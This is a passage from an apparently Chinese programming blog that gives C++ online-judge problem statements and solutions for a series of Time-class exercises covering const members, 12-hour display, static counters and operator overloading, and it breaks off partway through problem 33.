        cin &gt;&gt; h &gt;&gt; m &gt;&gt; s ;
        return *this;
    &#125;  
&#125;;
/////////////////////////////
int main()
&#123;
    Time t;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        if(i % 4 == 0)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            Time tt(hour, minute, second);
            tt.showTime();
        &#125;
        if(i % 4 == 1)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            t.setTime(hour, minute, second).showTime();
        &#125;
        if(i % 4 == 2)
            t.inputTime().showTime();
        if(i % 4 == 3)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            t.hour(hour);
            t.minute(minute);
            t.second(second);
            t.showTime();
        &#125;
    &#125;
&#125;</code></pre>
<h3 id="29-时间类的常量"><a href="#29-时间类的常量" class="headerlink" title="29.时间类的常量"></a>29.时间类的常量</h3><blockquote>
<h2 id="Description-28"><a href="#Description-28" class="headerlink" title="Description"></a>Description</h2><p>封装一个时间类Time，用于时间处理的相关功能，支持以下操作：</p>
<p>\1. Time::Time()无参构造方法。</p>
<p>\2. Time::Time(int,int,int)构造方法：传递时分秒的三个参数构造对象。</p>
<p>\3. Time::Time(const T&amp;)拷贝构造方法。</p>
<p>\4. 成员读函数：</p>
<p>   Time::hour()  ：返回Time的小时数；</p>
<p>   Time::minute()：返回Time的分钟数；</p>
<p>   Time::second()：返回Time的秒数。</p>
<p>\5. 成员写函数：</p>
<p>   Time::hour(int)  ：传参修改Time的小时数；</p>
<p>   Time::minute(int)：传参修改Time的分钟数；</p>
<p>   Time::second(int)：传参修改Time的秒数。</p>
<p>\6. 对象整体读写方法：</p>
<p>   Time::setTime(int,int,int)方法：传递时分秒三个参数修改Time对象的时分秒数。该方法返回修改后的对象。</p>
<p>   Time::setTime(const T&amp;)方法：传递一个参数修改Time对象的时分秒数。该方法返回修改后的对象。</p>
<p>   Time::getTime()方法：返回对象自身的引用。其实，t.getTime()即t。</p>
<p>   仅在Time类中的Time::getTime()方法实在是多余，在组合或者继承关系时才会有机会用到。</p>
<p>\7. Time::inputTime()方法：按格式从标准输入读取数据修改Time对象的时分秒数值。该方法返回修改后的对象。</p>
<p>\8. Time::showTime()方法：输出“hh:mm:ss”，不足两位的要前面补0。如果对象不是合法的时间，则输出“Time error”。</p>
<p>注意：为了保证Time类的常量对象能够正确的调用Time类的方法，那些不修改对象数据成员的函数都应该是常量成员函数，在返回对象自身的引用时也应返回常量引用。</p>
<p>你设计一个时间类Time，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。main()函数内容稍微繁复，仅为测试对象的各种调用情况。</p>
<h2 id="Input-28"><a href="#Input-28" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据，每组3个整数：hh,mm,ss，分别表示时、分、秒，其值都在int范围内。</p>
<h2 id="Output-28"><a href="#Output-28" class="headerlink" title="Output"></a>Output</h2><p>开始部分为由main()函数产生的固定输出，用于测试对象的某些方法的调用情况。输出“Test data output :”之后为测试数据对应的输出：</p>
<p>每组测试数据对应一组输出“hh:mm:ss”，不足两位的输出需要前面补0。如果输入的时间不合法，则输出“Time error”。格式见sample。</p>
<h2 id="Sample-Input-28"><a href="#Sample-Input-28" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>60 0 10 59 591 1 6023 0 023 59 5924 1 0</p>
<h2 id="Sample-Output-28"><a href="#Sample-Output-28" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Constant test output :00:00:0001:02:03Time errorTest data output :00:00:0100:59:59Time error23:00:0023:59:59Time error</p>
<h2 id="HINT-28"><a href="#HINT-28" class="headerlink" title="HINT"></a>HINT</h2><p>输出格式用头文件<iomanip>中流操作算子：</p>
<p>setw(w)   ：设置数据的输出宽度为w个字符</p>
<p>setfill(c)：设置用字符c作为填充字符</p>
<h2 id="Append-Code-28"><a href="#Append-Code-28" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1390&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
private:
    int h,m,s;
public:
    Time():h(0),m(0),s(0)&#123;&#125;
    Time(int hh, int mm, int ss):h(hh),m(mm),s(ss)&#123; &#125;
    Time(const Time&amp; t)&#123;h = t.h;m = t.m;s = t.s;cout &lt;&lt; &quot;There was a call to the copy constructor : &quot; &lt;&lt; h &lt;&lt; &quot;,&quot; &lt;&lt; m &lt;&lt; &quot;,&quot; &lt;&lt; s &lt;&lt; endl;&#125;
    Time &amp;setTime(int hh,int mm,int ss)  
    &#123;  
        h = hh;m = mm;s = ss;  
        return *this;  
    &#125;
    Time &amp;setTime(const Time &amp; t)  
    &#123;  
        h = t.hour();  
        m = t.minute();  
        s = t.second();  
        return *this;  
    &#125;  
    const Time &amp;getTime()const  
    &#123;  
        return *this;  
    &#125;  
    void hour(int hh)&#123;h=hh;&#125;
    void minute(int mm)&#123;m=mm;&#125;
    void second(int ss)&#123;s=ss;&#125;    
    int hour()const&#123;return h;&#125;  
    int minute()const&#123;return m;&#125;  
    int second()const&#123;return s;&#125;  
    void showTime() const&#123;
        if(h &lt; 24 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; endl;
        else
            cout &lt;&lt; &quot;Time error&quot; &lt;&lt; endl;
    &#125;    
    Time &amp;inputTime()&#123; 
        cin &gt;&gt; h &gt;&gt; m &gt;&gt; s ;
        return *this;
    &#125;  
&#125;;

//////////////////////////////
int main()
&#123;
    cout&lt;&lt;&quot;Constant test output :&quot;&lt;&lt;endl;
    const Time c;
    const Time cc(1, 2, 3);
    const Time ccc(23, 60, 60);
    cout&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;c.hour()&lt;&lt;&quot;:&quot;;
    cout&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;c.minute()&lt;&lt;&quot;:&quot;;
    cout&lt;&lt;setw(2)&lt;&lt;setfill(&#39;0&#39;)&lt;&lt;c.second()&lt;&lt;endl;
    cc.getTime().showTime();
    ccc.showTime();

    cout&lt;&lt;&quot;\nTest data output :&quot;&lt;&lt;endl;
    Time t;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        if(i % 4 == 0)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            Time tt(hour, minute, second);
            tt.showTime();
        &#125;
        if(i % 4 == 1)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            t.setTime(hour, minute, second).showTime();
        &#125;
        if(i % 4 == 2)
            t.inputTime().showTime();
        if(i % 4 == 3)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            t.hour(hour);
            t.minute(minute);
            t.second(second);
            t.showTime();
        &#125;
    &#125;
&#125;
</code></pre>
<h3 id="30-时间类的12小时制输出"><a href="#30-时间类的12小时制输出" class="headerlink" title="30.时间类的12小时制输出"></a>30.时间类的12小时制输出</h3><blockquote>
<h2 id="Description-29"><a href="#Description-29" class="headerlink" title="Description"></a>Description</h2><p>封装一个时间类Time，用于时间处理的相关功能，支持24小时制和12小时制，支持以下操作：</p>
<p>\1. Time::Time()无参构造方法。</p>
<p>\2. Time::Time(int,int,int)构造方法：传递时分秒的三个参数构造对象。</p>
<p>\3. Time::Time(const T&amp;)拷贝构造方法。</p>
<p>\4. 成员读函数：</p>
<p>   Time::hour()  ：返回Time的小时数；</p>
<p>   Time::minute()：返回Time的分钟数；</p>
<p>   Time::second()：返回Time的秒数。</p>
<p>\5. 成员写函数：</p>
<p>   Time::hour(int)  ：传参修改Time的小时数；</p>
<p>   Time::minute(int)：传参修改Time的分钟数；</p>
<p>   Time::second(int)：传参修改Time的秒数。</p>
<p>\6. 对象整体读写方法：</p>
<p>   Time::setTime(int,int,int)方法：传递时分秒三个参数修改Time对象的时分秒数。该方法返回修改后的对象。</p>
<p>   Time::setTime(const T&amp;)方法：传递一个参数修改Time对象的时分秒数。该方法返回修改后的对象。</p>
<p>   Time::getTime()方法：返回对象自身的引用。其实，t.getTime()即t。</p>
<p>   仅在Time类中的Time::getTime()方法实在是多余，在组合或者继承关系时才会有机会用到。</p>
<p>\7. Time::inputTime()方法：按格式从标准输入读取数据修改Time对象的时分秒数值。该方法返回修改后的对象。</p>
<p>\8. Time::showTime()方法：输出“hh:mm:ss”，不足两位的要前面补0。如果对象不是合法的时间，则输出“Time error”。</p>
<p>\9. Time::showTime12Hour()方法：输出12小时制的时间：上午输出“hh:mm:ss a.m.”、下午输出“hh:mm:ss p.m.”。如果对象不是合法的时间，则输出“Time error”。注意：该函数仅显示12小时制时间，并不修改对象的数据成员，对象依然存储24小时制时间。</p>
<p>12小时制以数字12、1、2、3、4、5、6、7、8、9、10、11依次序表示每个时段的。</p>
<p>24小时制的00:00～00:59，是12小时制的12:00 a.m.～12:59 a.m.；</p>
<p>24小时制的1:00～11:59是十二小时制的1:00 a.m.～11:59 a.m.。</p>
<p>24小时制的12:00～12:59，是12小时制的12:00 p.m.～12:59 p.m.；</p>
<p>24小时制的13:00～23:59是十二小时制的1:00 p.m.～11:59 p.m.。</p>
<p>你设计一个时间类Time，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。main()函数内容稍微繁复，仅为测试对象的各种调用情况。</p>
<h2 id="Input-29"><a href="#Input-29" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据，每组3个整数：hh,mm,ss，分别表示时、分、秒，其值都在int范围内。</p>
<h2 id="Output-29"><a href="#Output-29" class="headerlink" title="Output"></a>Output</h2><p>开始部分为由main()函数产生的固定输出，用于测试对象的某些方法的调用情况。输出“Test data output :”之后为测试数据对应的输出：</p>
<p>每组测试数据对应一组输出，奇数行的输入对应输出24小时制时间“hh:mm:ss”，偶数行的输入对应输出12小时制时间：上午输出“hh:mm:ss a.m.”、下午输出“hh:mm:ss p.m.”，不足两位的输出需要前面补0。如果输入的时间不合法，则输出“Time error”。格式见sample。</p>
<h2 id="Sample-Input-29"><a href="#Sample-Input-29" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>60 0 10 59 591 1 6023 0 023 59 5924 1 0</p>
<h2 id="Sample-Output-29"><a href="#Sample-Output-29" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Constant test output :11:59:58 a.m.12:00:01 p.m.11:59:5812:00:01Test data output :00:00:0112:59:59 a.m.Time error11:00:00 p.m.23:59:59Time error</p>
<h2 id="HINT-29"><a href="#HINT-29" class="headerlink" title="HINT"></a>HINT</h2><p>输出格式用头文件<iomanip>中流操作算子：</p>
<p>setw(w)   ：设置数据的输出宽度为w个字符</p>
<p>setfill(c)：设置用字符c作为填充字符</p>
<h2 id="Append-Code-29"><a href="#Append-Code-29" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1391&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
private:
    int h,m,s;
public:
    Time():h(0),m(0),s(0)&#123;&#125;
    Time(int hh, int mm, int ss):h(hh),m(mm),s(ss)&#123; &#125;
    Time(const Time&amp; t)&#123;h = t.h;m = t.m;s = t.s;cout &lt;&lt; &quot;There was a call to the copy constructor : &quot; &lt;&lt; h &lt;&lt; &quot;,&quot; &lt;&lt; m &lt;&lt; &quot;,&quot; &lt;&lt; s &lt;&lt; endl;&#125;
    Time &amp;setTime(int hh,int mm,int ss)  
    &#123;  
        h = hh;m = mm;s = ss;  
        return *this;  
    &#125;
    Time &amp;setTime(const Time &amp; t)  
    &#123;  
        h = t.hour();  
        m = t.minute();  
        s = t.second();  
        return *this;  
    &#125;  
    const Time &amp;getTime()const  
    &#123;  
        return *this;  
    &#125;  
    void hour(int hh)&#123;h=hh;&#125;
    void minute(int mm)&#123;m=mm;&#125;
    void second(int ss)&#123;s=ss;&#125;    
    int hour()const&#123;return h;&#125;  
    int minute()const&#123;return m;&#125;  
    int second()const&#123;return s;&#125;  
    void showTime() const&#123;
        if(h &lt; 24 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; endl;
        else
            cout &lt;&lt; &quot;Time error&quot; &lt;&lt; endl;
    &#125;    
    Time &amp;inputTime()&#123; 
        cin &gt;&gt; h &gt;&gt; m &gt;&gt; s ;
        return *this;
    &#125;  
    void showTime12Hour()const&#123;
        if(h &gt;= 1 &amp;&amp; h &lt; 12 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; &quot; a.m.&quot; &lt;&lt; endl;            
        else if(h &gt;= 0 &amp;&amp; h &lt; 1 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; &quot;12&quot; &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; &quot; a.m.&quot; &lt;&lt; endl;            
        else if(h &gt;= 12 &amp;&amp; h &lt; 13 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; &quot;12&quot; &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; &quot; p.m.&quot; &lt;&lt; endl;            
        else if(h &gt;= 13 &amp;&amp; h &lt; 24 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h-12 &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; &quot; p.m.&quot; &lt;&lt; endl;            
        else
            cout &lt;&lt; &quot;Time error&quot; &lt;&lt; endl;            
    &#125;
&#125;;
/////////////////////////////
int main()
&#123;
    cout&lt;&lt;&quot;Constant test output :&quot;&lt;&lt;endl;
    const Time c(11, 59, 58);
    const Time cc(12, 0, 1);
    c.showTime12Hour();
    cc.showTime12Hour();
    c.showTime();
    cc.showTime();

    cout&lt;&lt;&quot;\nTest data output :&quot;&lt;&lt;endl;
    Time t;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        if(i % 4 == 0)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            Time tt(hour, minute, second);
            tt.showTime12Hour();
        &#125;
        if(i % 4 == 1)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            t.setTime(hour, minute, second).showTime();
        &#125;
        if(i % 4 == 2)
            t.inputTime().showTime12Hour();
        if(i % 4 == 3)
        &#123;
            int hour, minute, second;
            cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second;
            t.hour(hour);
            t.minute(minute);
            t.second(second);
            t.showTime();
        &#125;
    &#125;
&#125;
</code></pre>
<h3 id="31-时间类的静态成员计数"><a href="#31-时间类的静态成员计数" class="headerlink" title="31.时间类的静态成员计数"></a>31.时间类的静态成员计数</h3><blockquote>
<h2 id="Description-30"><a href="#Description-30" class="headerlink" title="Description"></a>Description</h2><p>封装一个时间类Time，用于时间处理的相关功能，支持以下操作：</p>
<p>\1. Time::Time()无参构造方法。</p>
<p>\2. Time::Time(int,int,int)构造方法：传递时分秒的三个参数构造对象。</p>
<p>\3. Time::Time(const T&amp;)拷贝构造方法。</p>
<p>\4. 对象整体读写方法：</p>
<p>   Time::setTime(int,int,int)方法：传递时分秒三个参数修改Time对象的时分秒数。该方法返回修改后的对象。</p>
<p>   Time::setTime(const T&amp;)方法：传递一个参数修改Time对象的时分秒数。该方法返回修改后的对象。</p>
<p>   Time::getTime()方法：返回对象自身的引用。其实，t.getTime()即t。</p>
<p>   仅在Time类中的Time::getTime()方法实在是多余，在组合或者继承关系时才会有机会用到。</p>
<p>\5. Time::showTime()方法：输出“hh:mm:ss”，不足两位的要前面补0。如果对象不是合法的时间，则输出“Time error”。</p>
<p>\6. 静态成员方法：</p>
<p>   Time::getNumber()方法：返回程序中已创建的Time对象总数。</p>
<p>   Time::displayNumber()方法：输出程序中已创建的Time对象总数。</p>
<p>注意：在用Time对象传递参数时应传对象的引用而不是直接传对象，返回对象时同样返回引用，以免产生多余的对象拷贝。多余的拷贝构造会引起对象计数的错误。</p>
<p>你设计一个时间类Time，使得main()函数能够正确运行。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数。main()函数内容稍微繁复，仅为测试对象的各种调用情况。</p>
<h2 id="Input-30"><a href="#Input-30" class="headerlink" title="Input"></a>Input</h2><p>输入为多行，每行为一组测试数据，每组3个整数：hh,mm,ss，分别表示时、分、秒，其值都在int范围内。</p>
<h2 id="Output-30"><a href="#Output-30" class="headerlink" title="Output"></a>Output</h2><p>开始部分为由main()函数产生的固定输出，用于测试对象的某些方法的调用情况。输出“Test data output :”之后为测试数据对应的输出：</p>
<p>每组测试数据对应一组输出“hh:mm:ss”，不足两位的输出需要前面补0。如果输入的时间不合法，则输出“Time error”。格式见sample。</p>
<p>最后一行输出一个整数n，表示有n组测试数据输入。</p>
<h2 id="Sample-Input-30"><a href="#Sample-Input-30" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>0 0 10 59 591 1 6023 0 023 59 5924 1 0</p>
<h2 id="Sample-Output-30"><a href="#Sample-Output-30" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Static member test output :Now, There is 0 object of Time.Now, There is 1 object of Time.There was a call to the copy constructor : 0,0,0Now, There is 2 object of Time.Now, There is 3 object of Time.There was a call to the copy constructor : 1,2,3Now, There is 4 object of Time.Test data output :00:00:0100:59:59Time error23:00:0023:59:59Time error6</p>
<h2 id="HINT-30"><a href="#HINT-30" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-30"><a href="#Append-Code-30" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1392&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
private:
    int h,m,s;
    static int num;
public:
    Time():h(0),m(0),s(0)&#123;num++;&#125;
    Time(int hh, int mm, int ss):h(hh),m(mm),s(ss)&#123;num++;&#125;
    Time(const Time&amp; t)&#123;h = t.h;m = t.m;s = t.s;cout &lt;&lt; &quot;There was a call to the copy constructor : &quot; &lt;&lt; h &lt;&lt; &quot;,&quot; &lt;&lt; m &lt;&lt; &quot;,&quot; &lt;&lt; s &lt;&lt; endl;num++;&#125;
    Time &amp;setTime(int hh,int mm,int ss)  
    &#123;  
        h = hh;m = mm;s = ss;  
        return *this;  
    &#125;
    Time &amp;setTime(const Time &amp; t)  
    &#123;  
        h = t.hour();  
        m = t.minute();  
        s = t.second();  
        return *this;  
    &#125;  
    const Time &amp;getTime()const  
    &#123;  
        return *this;  
    &#125;  
    void hour(int hh)&#123;h=hh;&#125;
    void minute(int mm)&#123;m=mm;&#125;
    void second(int ss)&#123;s=ss;&#125;    
    int hour()const&#123;return h;&#125;  
    int minute()const&#123;return m;&#125;  
    int second()const&#123;return s;&#125;  
    void showTime() const&#123;
        if(h &lt; 24 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; endl;
        else
            cout &lt;&lt; &quot;Time error&quot; &lt;&lt; endl;
    &#125;    
    Time &amp;inputTime()&#123; 
        cin &gt;&gt; h &gt;&gt; m &gt;&gt; s ;
        return *this;
    &#125;  
    static int getNumber()&#123;return num;&#125;
    static void displayNumber()&#123;
        cout &lt;&lt; &quot;Now, There is &quot; &lt;&lt; num &lt;&lt; &quot; object of Time.&quot; &lt;&lt; endl;
    &#125;
&#125;;
int Time::num=0;
////////////////////
int main()
&#123;
    cout&lt;&lt;&quot;Static member test output :&quot;&lt;&lt;endl;
    Time::displayNumber();
    Time t;
    t.displayNumber();
    Time tt(t);
    tt.displayNumber();
    Time ttt(1, 2, 3);
    ttt.displayNumber();
    Time tttt(ttt.getTime());
    tttt.displayNumber();
    int non_cases = Time::getNumber();

    cout&lt;&lt;&quot;\nTest data output :&quot;&lt;&lt;endl;
    int hour, minute, second;
    while(cin&gt;&gt;hour&gt;&gt;minute&gt;&gt;second)
    &#123;
        Time t;
        t.setTime(hour, minute, second).showTime();
    &#125;
    cout&lt;&lt;t.getNumber() - non_cases&lt;&lt;endl;
&#125;</code></pre>
<blockquote>
<p>static–<a href="http://www.cnblogs.com/yc_sunniwell/archive/2010/07/14/1777441.html">http://www.cnblogs.com/yc_sunniwell/archive/2010/07/14/1777441.html</a></p>
<p> C++的static有两种用法：面向过程程序设计的static和面向对象程序设计中的static。前者应用于普通变量和函数，不涉及类；后者主要说明static在类中的作用。</p>
</blockquote>
<h3 id="32-时间类的加、减法赋值运算"><a href="#32-时间类的加、减法赋值运算" class="headerlink" title="32.时间类的加、减法赋值运算"></a>32.时间类的加、减法赋值运算</h3><blockquote>
<h2 id="Description-31"><a href="#Description-31" class="headerlink" title="Description"></a>Description</h2><p>封装一个时间类Time，在类上重载以下运算符，使得main()函数能够正确运行。</p>
<p>\1. Time::Time()无参构造方法。</p>
<p>\2. Time::inputTime()方法：按格式从标准输入读取数据修改Time对象的时分秒数值。该方法返回修改后的对象。</p>
<p>\3. Time::showTime()方法：输出“hh:mm:ss”，不足两位的要前面补0。如果对象不是合法的时间，则输出“Time error”。</p>
<p>\4. 运算符</p>
<p>加法赋值运算符“+=”和减法赋值运算符“-=”：把一个整数m加到Time对象自身，并且仅对合法的时间操作，不会产生不合法的时间，比如：</p>
<p>若原时间对象为“00:00:00”，减去2后的对象为“23:59:58”;</p>
<p>若原时间对象为“23:59:59”，加上1后的对象为“00:00:00”;</p>
<p>若原时间对象为“24:60:60”，加减后的对象仍为“24:60:60”</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数</p>
<h2 id="Input-31"><a href="#Input-31" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据，每组4个整数，前三个整数为：hh,mm,ss，分别表示时、分、秒，其值都在int范围内，最后一个整数为m。</p>
<h2 id="Output-31"><a href="#Output-31" class="headerlink" title="Output"></a>Output</h2><p>每个输入对应两行输出，分别为时间“hh,mm,ss”加上m秒和减去m秒后的值。错误的时间输出“Time error”</p>
<h2 id="Sample-Input-31"><a href="#Sample-Input-31" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>60 0 1 20 59 59 11 1 60 1023 0 0 6023 59 59 10024 1 0 3</p>
<h2 id="Sample-Output-31"><a href="#Sample-Output-31" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>00:00:0323:59:5901:00:0000:59:58Time errorTime error23:01:0022:59:0000:01:3923:58:19Time errorTime error</p>
<h2 id="HINT-31"><a href="#HINT-31" class="headerlink" title="HINT"></a>HINT</h2><p>输出格式用头文件<iomanip>中流操作算子：</p>
<p>setw(w)   ：设置数据的输出宽度为w个字符</p>
<p>setfill(c)：设置用字符c作为填充字符</p>
<p>left      ：设置输出左对齐</p>
<p>right     ：设置输出优对齐</p>
<h2 id="Append-Code-31"><a href="#Append-Code-31" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1395&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
#include &lt;iomanip&gt;
using namespace std;
class Time&#123;
private:
    int h,m,s;
    int k;
public:
    Time():h(0),m(0),s(0)&#123;&#125;
    Time(int hh, int mm, int ss):h(hh),m(mm),s(ss)&#123; &#125;
    Time(const Time&amp; t)&#123;h = t.h;m = t.m;s = t.s;&#125;
    Time &amp;setTime(int hh,int mm,int ss)  
    &#123;  
        h = hh;m = mm;s = ss;  
        return *this;  
    &#125;
    Time &amp;setTime(const Time &amp; t)  
    &#123;  
        h = t.hour();  
        m = t.minute();  
        s = t.second();  
        return *this;  
    &#125;  
    const Time &amp;getTime()const  
    &#123;  
        return *this;  
    &#125;  
    void hour(int hh)&#123;h=hh;&#125;
    void minute(int mm)&#123;m=mm;&#125;
    void second(int ss)&#123;s=ss;&#125;    
    int hour()const&#123;return h;&#125;  
    int minute()const&#123;return m;&#125;  
    int second()const&#123;return s;&#125;  
    void showTime() const&#123;
        if(h &lt; 24 &amp;&amp; m &lt; 60 &amp;&amp; s &lt; 60)
            cout &lt;&lt; setw(2) &lt;&lt; setfill(&#39;0&#39;) &lt;&lt; h &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; m &lt;&lt; &quot;:&quot; &lt;&lt; setw(2) &lt;&lt; s &lt;&lt; endl;
        else
            cout &lt;&lt; &quot;Time error&quot; &lt;&lt; endl;
    &#125;    
    Time &amp;inputTime()&#123; 
        cin &gt;&gt; h &gt;&gt; m &gt;&gt; s ;
        return *this;
    &#125;  
    Time&amp; operator +=(int t)  
    &#123;  
        if(h*3600 + m*60 + s &gt;= 24*3600|| m&gt;59||s&gt;59||h&lt;0||s&lt;0||m&lt;0)  
            return *this;  
        else  
        &#123;  
            k = (h*3600 + m*60 + s+t)%(24*3600);  
            h = k/3600;  
            m = (k -h*3600)/60;  
            s = k-h*3600-m*60;  
            return *this;  
        &#125;  
    &#125;  
    Time&amp; operator -=(int t)  
    &#123;  
           if(h*3600 + m*60 + s &gt;= 24*3600|| m&gt;59||s&gt;59||h&lt;0||s&lt;0||m&lt;0)  
            return *this;  
        else  
        &#123;  
            k = (h*3600 + m*60 + s-t+24*3600)%(24*3600);  
            h = k/3600;  
            m = (k -h*3600)/60;  
            s = k-h*3600-m*60;  
            return *this;  
        &#125;  
    &#125;  
&#125;;
///////////////
int main()
&#123;
    int cases;
    cin&gt;&gt;cases;
    for(int i = 1; i &lt;= cases; ++i)
    &#123;
        Time t;
        t.inputTime();
        Time tt(t);
        int num;
        cin&gt;&gt;num;
        t += num;
        t.showTime();
        tt -= num;
        tt.showTime();
    &#125;
&#125;</code></pre>
<h3 id="33-时间类的流插入、提取和递增、递减运算"><a href="#33-时间类的流插入、提取和递增、递减运算" class="headerlink" title="33.时间类的流插入、提取和递增、递减运算"></a>33.时间类的流插入、提取和递增、递减运算</h3><blockquote>
<h2 id="Description-32"><a href="#Description-32" class="headerlink" title="Description"></a>Description</h2><p>封装一个时间类Time，在类上重载以下运算符，使得main()函数能够正确运行。</p>
<p>流插入操作符“&gt;&gt;”，按照输入格式从标准输入读取三个整数：hh,mm,ss，分别表示时、分、秒，其值在int范围内。</p>
<p>流提取操作符“&lt;&lt;”；按照“hh:mm:ss”输出Time类的对象，不合法的时间输出“error!!!”。</p>
<p>前置自增运算符“++”：把时间对象的秒数加1并返回。</p>
<p>前置自减运算符“–”：把时间对象的秒数减1并返回。</p>
<p>后置自增运算符“++”：把时间对象的秒数加1，返回原值。</p>
<p>后置自减运算符“–”：把时间对象的秒数减1，返回原值。</p>
<p>以上4个自增、自减仅对合法的时间操作，并且不会产生不合法的时间。比如：</p>
<p>若原时间对象为“00:00:00”，自减运算后的对象为“23:59:59”;</p>
<p>若原时间对象为“23:59:59”，自增运算后的对象为“00:00:00”;</p>
<p>若原时间对象为“24:60:60”，自增或自减运算后对象仍为“24:60:60”。</p>
<p>函数调用格式见append.cc。</p>
<p>append.cc中已给出main()函数</p>
<h2 id="Input-32"><a href="#Input-32" class="headerlink" title="Input"></a>Input</h2><p>输入的第一个整数n，表示有n组测试数据，每组3个整数：hh,mm,ss，分别表示时、分、秒，其值都在int范围内。</p>
<h2 id="Output-32"><a href="#Output-32" class="headerlink" title="Output"></a>Output</h2><p>输出一张表：每列8个字符宽，两列之间有一个空格。</p>
<p>首先，输出一个表头：“++t      –t      t        t–      t++      t       ”，</p>
<p>其次，对应每组测试数据在一行内依次以下内容：</p>
<p>前置++、前置–、原值、后置–、后置++、原值。</p>
<p>若输入的日期合法，输出格式为“hh:mm:ss”，不足两位的输出需要前面补0。如果输入的时间不合法，则输出“error!!!”。格式见sample。</p>
